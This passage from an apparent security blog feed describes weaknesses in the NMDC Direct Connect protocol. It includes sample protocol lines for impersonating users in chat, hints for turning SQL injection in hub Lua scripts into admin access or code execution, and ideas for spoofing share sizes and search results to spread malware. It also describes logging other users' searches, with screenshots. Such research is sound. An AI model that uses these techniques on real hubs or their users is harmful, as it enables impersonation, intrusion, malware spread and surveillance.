hub = NMDCClient("10.8.20.21", 4112, db_settings)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Now, you are ready. Use one of the following commands&lt;/p&gt;
&lt;p&gt;:::bash
python2 nmdc.py listen # Will connect to a hub and just be in listen mode i.e will keep printing to screen what it gets
python2 nmdc.py collect # Will collect file lists from the users and place the xml files in a folder named file_lists
python2 nmdc.py analyse # Will parse the collected files in the file_lists folder and add them to the db with proper relationships with the user&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Working&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;See the source code :P&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Demos&lt;/h4&gt;
&lt;hr&gt;
&lt;iframe width="640" height="480" src="https://www.youtube.com/embed/o7UbuifCXpI" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr&gt;
&lt;iframe width="640" height="480" src="https://www.youtube.com/embed/rgcNEaU4kJs" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr&gt;
&lt;iframe width="640" height="480" src="https://www.youtube.com/embed/AB4Tj_EkDrQ" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;</content><category term="tools"></category><category term="python"></category></entry><entry><title>Messing around using NMDC protocol</title><link href="https://tunnelshade.in/blog/2014/11/messing-with-nmdc/" rel="alternate"></link><published>2014-11-15T00:00:00+05:30</published><updated>2014-11-15T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-11-15:/blog/2014/11/messing-with-nmdc/</id><summary type="html">&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/NeoModus_Direct_Connect"&gt;&lt;strong&gt;NeoModus Direct Connect&lt;/strong&gt;&lt;/a&gt; was initially a file-sharing client for
Windows and Mac users that provided file-sharing capabilities for any type of file within a hub-centric, peer-to-peer network.
NeoModus Direct Connect inspired the creation of open-source versions of the client, such as Open Direct Connect and later DC++.
DC++ itself has â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/NeoModus_Direct_Connect"&gt;&lt;strong&gt;NeoModus Direct Connect&lt;/strong&gt;&lt;/a&gt; was initially a file-sharing client for
Windows and Mac users that provided file-sharing capabilities for any type of file within a hub-centric, peer-to-peer network.
NeoModus Direct Connect inspired the creation of open-source versions of the client, such as Open Direct Connect and later DC++.
DC++ itself has several specialized spin-off open-source versions as well, such as ApexDC++ and StrongDC++, which are refined with
features particular to user groups, such as filters, language packs, and search capabilities.&lt;/p&gt;
&lt;h3&gt;Why NMDC?&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;Inside my University the most popular way of sharing files is using these DC Hubs. Not only us, there are many hubs in local networks
of many educational institutions. For example, look at &lt;a href="http://dc.iitb.me"&gt;this&lt;/a&gt; cool utility in &lt;strong&gt;IIT-B&lt;/strong&gt;. There are many hubs on the
internet as well whose list is available &lt;a href="http://dchublist.org/nmdc-hubs"&gt;here&lt;/a&gt;. So, I was intrigued to understand this protocol
better to see how secure it is. Moreover no major analysis is available on the internet for me to go through.&lt;/p&gt;
&lt;h3&gt;What did I do?&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;The best resources I have are &lt;a href="http://nmdc.sourceforge.net/NMDC.html"&gt;this&lt;/a&gt; &amp;amp; &lt;a href="http://wiki.gusari.org/index.php?title=Main_Page"&gt;this&lt;/a&gt;.
Inorder to be able to test various stuff, I used python to write small snippets using socket library to try different stuff.&lt;/p&gt;
&lt;h3&gt;Bugs/Hacks&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;The commands in the protocol start with a &lt;strong&gt;'$'&lt;/strong&gt; sign and end with a &lt;strong&gt;'|'&lt;/strong&gt;. The list of commands are available &lt;a href="http://nmdc.sourceforge.net/NMDC.html"&gt;here&lt;/a&gt;.
Since the analysis is currently in progress, I will try to update this section whenever I find something new. The hacks are classified
into three categories&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Client Side - The bugs which are caused because of improper handling in client softwares&lt;/li&gt;
&lt;li&gt;Hub Side - The bugs which are caused because of hub softwares&lt;/li&gt;
&lt;li&gt;Protocol Side - The bugs which try to use the protocol in unexpected ways&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Client Side Hacks&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;User Spoofing in public/private chat&lt;/h4&gt;
&lt;p&gt;The command to send public and private messages are of the following format&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$&amp;lt;john&amp;gt; cats are cute|
$To: john From: peter $&amp;lt;peter&amp;gt; dogs are more cute|
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If you register your nick as &lt;strong&gt;john&amp;gt;&lt;/strong&gt;, some clients strip out the trailing &lt;strong&gt;&amp;gt;&lt;/strong&gt; and display the message which makes it appear as if
it is from &lt;strong&gt;john&lt;/strong&gt;. The message commands will look like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$&amp;lt;john&amp;gt;&amp;gt; I really don&amp;#39;t care about what you think|
$To: peter From: john&amp;gt; $&amp;lt;john&amp;gt;&amp;gt; You are an idiot|
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Some clients on which I tested this are&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;StrongDC++ (&amp;lt;=2.42)&lt;/li&gt;
&lt;li&gt;DC++ (&amp;lt;=0.843)&lt;/li&gt;
&lt;li&gt;I am sure there will be many more...&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Hub Side Hacks&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;Vulnerable Lua Scripts (From SQLi to RCE)&lt;/h4&gt;
&lt;p&gt;Like every other place, insecure extensions bring in more vulnerabilities. Most of the hub softwares make available &lt;strong&gt;a lua scripting
engine&lt;/strong&gt; to make things more extensible. There are tons of lua scripts already present on the internet whose functionality vary from
chat logging to anagrams. Check &lt;a href="http://script-bot.dcstuff.nl/index.php?dir="&gt;here&lt;/a&gt; for some sample scripts. So, how can you exploit
these?? Check &lt;a href="https://github.com/hjpotter92/ptokax-scripts/blob/4173050f3d35f11b90c0c21bcdd6d96d5459e3fb/external/stats/toks.lua#L60"&gt;this&lt;/a&gt;!
There are scripts which use SQL databases, some chat loggers write directly to a log file with certain naming etc... So if you are
lucky enough to find a script which uses unescaped user data in its db queries, you might actually end up having a SQLi right there.
One way to go is to make yourself Admin or elevate it to RCE if possible. How to detect it? Generally to keep things simple for the
normal users, hubs send command of the following format which clients tend to display as hub options for a user. The user command looks
like &lt;a href="http://nmdc.sourceforge.net/NMDC.html#_usercommand"&gt;this&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$UserCommand 2 6 Kick$$To: %[nick] From: %[mynick] $&amp;lt;%[mynick]&amp;gt; You are being kicked====|$Kick %[nick]|| $UserCommand 255 1|
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, dig around nicely for such instructions and you might get lucky finding some lua scripts which provide some extra functionality.
Try fingerprinting the script, search on internet, do a source code review &amp;amp; BOOM!! &amp;lt;-- All this if you are lucky :P&lt;/p&gt;
&lt;p&gt;Sample UserCommands grabbed from a hub. There is lot of information leak which will tell you which script it is ;)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Ranks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Live&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt; &lt;span class="nt"&gt;location&lt;/span&gt; &lt;span class="nt"&gt;statistics&lt;/span&gt; &lt;span class="nt"&gt;by&lt;/span&gt; &lt;span class="nt"&gt;country&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;cclive&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Ranks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Live&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt; &lt;span class="nt"&gt;location&lt;/span&gt; &lt;span class="nt"&gt;statistics&lt;/span&gt; &lt;span class="nt"&gt;by&lt;/span&gt; &lt;span class="nt"&gt;city&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;citylive&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;cc&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Ranks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;All&lt;/span&gt; &lt;span class="nt"&gt;time&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt; &lt;span class="nt"&gt;location&lt;/span&gt; &lt;span class="nt"&gt;statistics&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;cchist&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Hub&lt;/span&gt; &lt;span class="nt"&gt;news&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Read&lt;/span&gt; &lt;span class="nt"&gt;hub&lt;/span&gt; &lt;span class="nt"&gt;news&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;hubnews&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;lines&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Releases&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;List&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;available&lt;/span&gt; &lt;span class="nt"&gt;releases&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;rellist&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;type&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;lines&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;category&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nx"&gt;publisher&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Releases&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Find&lt;/span&gt; &lt;span class="nt"&gt;release&lt;/span&gt; &lt;span class="nt"&gt;by&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;category&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;relfind&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Chat&lt;/span&gt; &lt;span class="nt"&gt;history&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Main&lt;/span&gt; &lt;span class="nt"&gt;chat&lt;/span&gt; &lt;span class="nt"&gt;history&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;history&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;lines&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Chat&lt;/span&gt; &lt;span class="nt"&gt;history&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Your&lt;/span&gt; &lt;span class="nt"&gt;main&lt;/span&gt; &lt;span class="nt"&gt;chat&lt;/span&gt; &lt;span class="nt"&gt;history&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;myhistory&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;lines&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Custom&lt;/span&gt; &lt;span class="nt"&gt;nicks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Get&lt;/span&gt; &lt;span class="nt"&gt;users&lt;/span&gt; &lt;span class="nt"&gt;real&lt;/span&gt; &lt;span class="nt"&gt;nick&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;realnick&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;nick&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Custom&lt;/span&gt; &lt;span class="nt"&gt;nicks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Custom&lt;/span&gt; &lt;span class="nt"&gt;nick&lt;/span&gt; &lt;span class="nt"&gt;list&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;custlist&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Hublist&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Show&lt;/span&gt; &lt;span class="nt"&gt;friendly&lt;/span&gt; &lt;span class="nt"&gt;hubs&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;showhubs&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;UserCommand&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;LJ&lt;/span&gt; &lt;span class="nt"&gt;palace&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.::&lt;/span&gt; &lt;span class="nt"&gt;Other&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Calculate&lt;/span&gt; &lt;span class="nt"&gt;an&lt;/span&gt; &lt;span class="nt"&gt;equation&lt;/span&gt; &lt;span class="o"&gt;$&amp;lt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mynick&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;calculate&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;equation&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;124&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Protocol Side Hacks&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;Spoofing Share Size&lt;/h4&gt;
&lt;p&gt;Since there is no practical way for the hub to verify your share size, you can spoof yours to attract people to browse your shared files.
This is not a huge attack on its own, but it has helped to draw the attention of users and make them download some malware :P. The command
in which share size is sent looks like &lt;a href="http://nmdc.sourceforge.net/NMDC.html#_myinfo"&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$MyINFO $ALL johndoe &amp;lt;++ V:0.673,M:P,H:0/1/0,S:2&amp;gt;$ $LAN(T3)0x31$example@example.com$1234$|
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Eavesdropping on users&lt;/h4&gt;
&lt;p&gt;The protocol is designed in such a way that whenever a user searches for a file, all the clients connected to that hub get
this search query. If you are using a dc client software, you will never know what others are searching since the clients automatically
send the search results by actually searching your shared files, but if you use a handcrafted client you can easily categorize all the
searches of a particular user. When the download slots for a file are not enough, the client software tries to search using the &lt;strong&gt;TTH&lt;/strong&gt;
of the file. Again this search is sent to all the connected clients. It is easy to match a TTH to a file, by just searching it on the hub
itself ;). Though this is facilitated by the protocol itself, I find it amusing to see what other users are searching for. So, some
screenshots of search queries that are extracted from some online hubs :P are present &lt;a href="http://i.imgur.com/X3CPMZI.png"&gt;here&lt;/a&gt;,
&lt;a href="http://i.imgur.com/XsPTNL5.jpg"&gt;here&lt;/a&gt; &amp;amp; &lt;a href="http://i.imgur.com/013VAZN.png"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i.imgur.com/X3CPMZI.png" class="image-center" style="height:500px" alt="IRC Screen"/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i.imgur.com/kPNCDQY.png" class="image-center" style="height:500px" alt="IRC Screen"/&gt;&lt;/p&gt;
&lt;p&gt;Instead of the ip addresses we can easily track the searches using registered nicks on the hub. All the TTH searches are the files
that are being downloaded by users. Some &lt;a href="http://pastebin.com/Xpr5HYfd"&gt;searches&lt;/a&gt; on my university hubs xD&lt;/p&gt;
&lt;h4&gt;Spreading malware (Spoofing search results)&lt;/h4&gt;
&lt;p&gt;We have already seen that the hub sends the search query to every connected client for results. We can send fake results as there
is no way a hub can verify if we have a file or not. So, if the user wants to download one of our results, we can just send
malware. But this is not as simple as it seems. There are many factors which are to be considered. For example, search queries can be
of following &lt;a href="http://nmdc.sourceforge.net/NMDC.html#_search"&gt;types&lt;/a&gt;&lt;/p&gt;
